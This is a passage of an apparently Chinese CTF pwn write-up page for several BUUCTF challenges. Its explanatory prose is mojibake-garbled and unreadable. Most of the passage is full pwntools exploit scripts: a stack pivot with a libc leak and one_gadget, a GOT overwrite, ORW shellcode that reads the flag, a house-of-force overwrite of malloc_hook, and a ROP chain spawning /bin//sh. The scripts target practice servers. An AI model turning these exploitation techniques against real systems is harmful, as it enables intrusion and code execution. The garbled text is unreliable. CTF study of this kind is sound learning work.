ˆè¿ç§»</strong></p><p>ï¼ˆåŸæœ¬leaveçš„åœ°æ–¹å¡«è¦è¿ç§»çš„åœ°å€ï¼ŒåŸæœ¬retçš„åœ°æ–¹å¡«leaveï¼›retçš„åœ°å€ï¼Œè¿˜æœ‰å°±æ˜¯è¿ç§»ä½ç½®è¦å¡«å……8ä¸ªaï¼‰</p><p><strong>åšé¢˜æ—¶é‡åˆ°çš„é—®é¢˜ï¼š</strong></p><p>1.libc.sym[â€˜mainâ€™]ä¸èƒ½ç”¨ï¼Œç›´æ¥idaæ‰¾mainåœ°å€</p><p>2.é€payloadè¦ç”¨sendï¼Œä¸èƒ½ç”¨sendlineï¼Œä¸ç„¶ä¸å¥½æ¥å—æ³„éœ²çš„å€¼</p><p>3.æˆ‘è¿™ä¸ªexpæ¨¡æ¿ogå¥½åƒåªæœ‰u16ï¼Œæ²¡å‘ç°æœ¬æ¥</p><p><strong>è®°ä¸€ä¸‹æ–¹æ³•ï¼Œå¤‡å¿˜ï¼š</strong></p><p>1.one_gadget <a href="http://libc-2.27.so">libc-2.27.so</a></p><p>2.ROPgadget --binary ./ACTF_2019_babystack |grep â€œleaveâ€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ACTF_2019_babystack&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29161</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------</span><br>leave_ret=<span class="hljs-number">0x400a18</span><br>ret=<span class="hljs-number">0x400709</span><br>pop_rdi=<span class="hljs-number">0x400ad3</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment">#main=elf.sym[&#x27;main&#x27;]</span><br>sleep(<span class="hljs-number">4</span>)<br>sl(<span class="hljs-string">&#x27;224&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;Your message will be saved at 0x&#x27;</span>)<br>addr=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(<span class="hljs-number">0x4008f6</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa8</span>+p64(addr)+p64(leave_ret))<br>ru(<span class="hljs-string">&#x27;Byebye~&#x27;</span>)<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>shell=base+<span class="hljs-number">0x4f2c5</span><br>sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;224&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(shell))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-got-shellï¼š">picoctf_2018_got_shellï¼š</h3><p>ç”¨hexè¾“å‡ºå’Œç”¨sendline</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./PicoCTF_2018_got-shell&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28451</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./PicoCTF_2018_got-shell&#x27;</span>)<br>backdoor=<span class="hljs-number">0x804854b</span><br>r.sendline(<span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>]))<br>r.sendline(<span class="hljs-built_in">hex</span>(backdoor))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-Not-Bad">[æå®¢å¤§æŒ‘æˆ˜ 2019]Not Bad</h3><p>è¿™é¢˜å¯ä»¥æº¢å‡º0x18ï¼Œä½†bufæ‰€åœ¨çš„æ ˆå¤ªå°ä¸å¤Ÿç”¨ropæ¥orwï¼Œè§£æ³•ï¼šæ ˆæº¢å‡ºå¤„æ„é€ ropè·³è½¬è‡³mmapç”³è¯·çš„åŒºåŸŸå¤„æ‰§è¡Œ</p><p>é‡Œé¢çš„orwå‘½ä»¤è¯»å–flag</p><p>**å·¥å…·ä½¿ç”¨ï¼š**seccomp-tools dump ./bad</p><p>çœ‹åˆ°å¯ç”¨readï¼Œwriteï¼Œopenï¼Œexit</p><p><strong>å‚è€ƒå¸ˆå‚…ï¼š</strong>[<a href="https://blog.csdn.net/mcmuyanga/article/details/113389703?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~default-7.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~default-7.no_search_link">BUUCTF]PWNâ€”â€”[æå®¢å¤§æŒ‘æˆ˜ 2019]Not Bad ï¼ˆorw_shellcodeï¼‰_mcmuyangaçš„åšå®¢-CSDNåšå®¢</a></p><p>â€‹       gdbè°ƒè¯•è¯¥é¢˜ï¼š[<a href="https://blog.csdn.net/weixin_46521144/article/details/115196495">BUUCTF]PWNâ€”â€”[æå®¢å¤§æŒ‘æˆ˜ 2019]Not Badè¯¦ç»†è§£é‡Š_N1ch0l4sçš„åšå®¢-CSDNåšå®¢</a></p><p>jmpå‘½ä»¤ï¼šæ— æ¡ä»¶çš„è½¬ç§»åˆ°æŒ‡ä»¤æŒ‡å®šçš„åœ°å€å»æ‰§è¡Œä»è¯¥åœ°å€å¼€å§‹çš„å‘½ä»¤</p><p>ï¼ˆjmp rsp å¯ä»¥æŠŠä½¿ç¨‹åºæ‰§è¡Œåˆ°æ ˆä¸Šrspçš„ä½ç½®ï¼‰</p><p><strong>orwå‘½ä»¤ï¼š</strong>  ä¸€èˆ¬éƒ½æ˜¯è¿™æ ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">mmap=<span class="hljs-number">0x123000</span><br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)           <span class="hljs-comment">#æ‰“å¼€æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶</span><br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap,<span class="hljs-number">0x50</span>)       <span class="hljs-comment">#è¯»å–æ–‡ä»¶æ ‡è¯†ç¬¦æ˜¯3çš„æ–‡ä»¶0x50ä¸ªå­—èŠ‚å­˜æ”¾åˆ°mmapåˆ†é…çš„åœ°å€ç©ºé—´é‡Œ</span><br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap,<span class="hljs-number">0x50</span>)      <span class="hljs-comment">#å°†mmapåœ°å€ä¸Šçš„å†…å®¹è¾“å‡º0x50ä¸ªå­—èŠ‚</span><br></code></pre></td></tr></table></figure><p><strong>mmapå‡½æ•°é‡Œçš„ä¿æŠ¤ç±»æƒé™</strong>ï¼š<br>PROT_READæ˜¯0x1<br>PROT_WRITEæ˜¯0x2<br>PROT_EXECæ˜¯0x4</p><p>mmapç”³è¯·çš„å‚æ•°è¿™é‡Œæ˜¯6ï¼Œå¯å†™å¯æ‰§è¡Œï¼Œä¹Ÿå¯ç”¨gdbè°ƒè¯•ï¼Œç”¨vmmapçœ‹rwx</p><p><strong>å…·ä½“è§£é¢˜æ­¥éª¤ï¼š</strong></p><p>1.æ„é€ ropé“¾,ä½¿å…¶å¯ä»¥è°ƒç”¨readå¾€mmapé‡Œè¯»å…¥0x100å¤§å°çš„æ•°æ®ï¼Œç„¶åè·³å…¥0x123000æ‰§è¡Œæ¥æ”¶flag</p><p>2.å¡«å…¥orwè¯­å¥</p><p><strong>paload1è§£é‡Šï¼š</strong></p><p>1.è°ƒç”¨readå¾€mmapé‡Œè¯»å…¥0x100å¤§å°çš„æ•°æ®ï¼Œç„¶åè·³å…¥0x123000æ‰§è¡Œæ¥æ”¶flag</p><p>2.ç”¨\x00å¡«å……è‡³åˆšå¥½è¦†ç›–rbp</p><p>3.è¿”å›åœ°å€å¡«jmp rspï¼Œä½¿ripæ‰§è¡Œåˆ°æ ˆä¸Šï¼Œrspå†å‡å»0x30åˆ°bufå¤„ï¼Œå†ç”¨jmp rspæ§åˆ¶ripåˆ°bufå¤„æ‰§è¡Œ</p><p>4.ç„¶åå°±èƒ½æ‰§è¡Œæœ€å‰é¢çš„è¯­å¥ï¼Œè°ƒç”¨readå¾€mmapé‡Œè¯»å…¥0x100å¤§å°çš„æ•°æ®ï¼Œç„¶åè·³å…¥0x123000æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,28690)</span><br>r=process(<span class="hljs-string">&#x27;./bad&#x27;</span>)<br>mmap=<span class="hljs-number">0x123000</span><br>jmp_rsp=<span class="hljs-number">0x400A01</span><br><span class="hljs-comment">#print len(asm(&quot;sub rsp,0x30;jmp rsp&quot;))</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#gdb.attach(r,&quot;b *0x400A49&quot;)</span><br>r.recvuntil(<span class="hljs-string">&#x27;have fun!&#x27;</span>)<br>payload1=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload1=payload1.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>payload1+=p64(jmp_rsp)<br>payload1+=asm(<span class="hljs-string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)<br>r.send(payload1)<br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap,<span class="hljs-number">0x50</span>)   <br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap,<span class="hljs-number">0x50</span>)      <br>r.send(asm(orw_payload))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-force">gyctf_2020_force</h3><p><strong>å‚è€ƒå¸ˆå‚…</strong>ï¼š<a href="https://blog.csdn.net/weixin_44145820/article/details/105522043">BUUCTF-PWN gyctf_2020_forceï¼ˆhouse of forceï¼‰_L.o.Wçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/qq_43986365/article/details/107976352">House of force â€”â€” gyctf_2020_force_PLpaçš„åšå®¢-CSDNåšå®¢</a></p><p>ç”¨house of forceï¼Œä¿®æ”¹malloc_hookä¸ºog</p><p><strong>å…·ä½“æ­¥éª¤ï¼š</strong></p><p>1.åˆ†é…ä¸€ä¸ªå¤§å°è¶…è¿‡ mmap åˆ†é…å¤§å°çš„å †ï¼Œç» mmap åˆ†é…ååœ°å€ä¸ libc æœ‰å›ºå®šåç§»ï¼Œç”±äºæœ¬é¢˜<strong>å‘ŠçŸ¥äº†chunkåœ°å€</strong>ï¼Œæˆ‘gdbçš„vmmapçœ‹ä¸€ä¸‹ï¼Œå¾—åˆ°çš„åœ°å€åŠ ä¸€ä¸‹å°±æ˜¯libc_base</p><p>è¿˜èƒ½é¡ºä¾¿å¾—åˆ°heapçš„åŸºå€ï¼Œè¿›è€Œå¾—çŸ¥topchunkçš„ptr</p><p>å¾—çŸ¥ogï¼Œrealloc</p><p>2.å†ç”³è¯·ä¸ªå †ï¼Œåˆ©ç”¨house of forceæŠŠmalloc_hook-8æ”¹ä¸ºogï¼Œmalloc_hookæ”¹ä¸ºrealloc</p><p>3.å†å°è¯•ç”³è¯·å †ï¼Œå¼€shell</p><p>ä¸»è¦è¯´ä¸€ä¸‹offset-0xf-0x8-0x10-0x8ï¼Œé¦–å…ˆèµ·ç è¦å‡-0xf-0x8,åˆå› ä¸ºchunkçš„ç¼˜æ•…ï¼Œé˜²æ­¢chunkçš„sizeç›–æ‰ï¼Œæ‰€ä»¥è¦-0x10</p><p>å†è°ƒè¯•çœ‹çœ‹ï¼Œå†-0x8çš„è¯å¡«å……8ä¸ªâ€˜aâ€™ï¼Œå°±èƒ½æŠŠogå’Œrealloc_hookå¸ƒç½®å¥½äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./gyctf_2020_force&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27923</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = elf.arch</span><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;2:puts\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;size\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        ru(<span class="hljs-string">&#x27;addr 0x&#x27;</span>)<br>        heap=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>        sa(<span class="hljs-string">&#x27;content\n&#x27;</span>,content)<br>        <span class="hljs-keyword">return</span> heap<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>        sla(<span class="hljs-string">&#x27;2:puts\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-comment">#-----------------------------------------</span><br>libc_base=add(<span class="hljs-number">0x200000</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x201000</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;libc_base : &#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>heap_base=add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;heap_base : &#x27;</span>+<span class="hljs-built_in">hex</span>(heap_base))<br>top_ptr=heap_base+<span class="hljs-number">0x10</span><br>malloc_hook = libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] + libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;malloc_hook:&#x27;</span>+<span class="hljs-built_in">hex</span>(malloc_hook))<br>offset=malloc_hook-top_ptr-<span class="hljs-number">0xf</span>-<span class="hljs-number">0x8</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span><br>realloc=libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]+libc_base<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;realloc:&#x27;</span>+<span class="hljs-built_in">hex</span>(realloc))<br>og=o_g_old[<span class="hljs-number">1</span>]+libc_base<br>add(offset,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(og)+p64(realloc+<span class="hljs-number">16</span>))<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&#x27;2:puts\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;size\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x50</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-can-you-gets-me">picoctf_2018_can_you_gets_me</h3><p>å‚è€ƒå¸ˆå‚…ï¼š[<a href="https://blog.csdn.net/mcmuyanga/article/details/112951679">BUUCTF]PWNâ€”â€”picoctf_2018_can_you_gets_me_mcmuyangaçš„åšå®¢-CSDNåšå®¢</a></p><p>å¯¹ä»˜è¿™ç§é™æ€ç¼–è¯‘é¢˜ï¼Œropchainé“å®šè¡Œ</p><p>ROPgadget --binary PicoCTF_2018_can-you-gets-me  --ropchain</p><p><strong>æ³¨æ„</strong>è¦å¯¼å…¥ä¸ªpackï¼Œfrom struct import pack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28020</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./PicoCTF_2018_can-you-gets-me&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pd</span>():<br>        p = <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x18</span>+<span class="hljs-number">4</span>)<br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea060</span>) <span class="hljs-comment"># @ .data</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b81c6</span>) <span class="hljs-comment"># pop eax ; ret</span><br>        p += <span class="hljs-string">&#x27;/bin&#x27;</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080549db</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea064</span>) <span class="hljs-comment"># @ .data + 4</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080b81c6</span>) <span class="hljs-comment"># pop eax ; ret</span><br>        p += <span class="hljs-string">&#x27;//sh&#x27;</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080549db</span>) <span class="hljs-comment"># mov dword ptr [edx], eax ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x0806f02a</span>) <span class="hljs-comment"># pop edx ; ret</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x080ea068</span>) <span class="hljs-comment"># @ .data + 8</span><br>        p += pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-number">0x08049303</span>) <span class="hljs-comment"># xor eax, eax ; ret</span><br>        p += pack(<span 